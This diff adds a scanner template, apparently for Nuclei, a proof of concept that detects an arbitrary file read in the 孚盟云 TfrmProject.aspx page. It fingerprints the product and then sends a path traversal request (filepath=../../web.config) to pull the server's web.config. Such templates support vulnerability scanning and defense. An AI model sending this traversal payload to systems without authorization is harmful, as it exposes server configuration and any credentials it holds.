@@ -1,0 +1,40 @@
+id: poc-yaml-fumasoft-tfrmproject-anyfile-read
+info:
+  name: 孚盟云 TfrmProject 任意文件读取漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "孚盟云"
+        part: body
+  - method: GET
+    path:
+      - "{{BaseURL}}/PageStructure/Normal/TfrmProject.aspx?filepath=../../web.config"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "</system.web>"
+          - "<configuration>"
+        part: body
+      - type: word
+        words:
+          - "filename=web.config"
+        part: header
+      - type: word
+        words:
+          - "application/octet-stream"
+        part: header
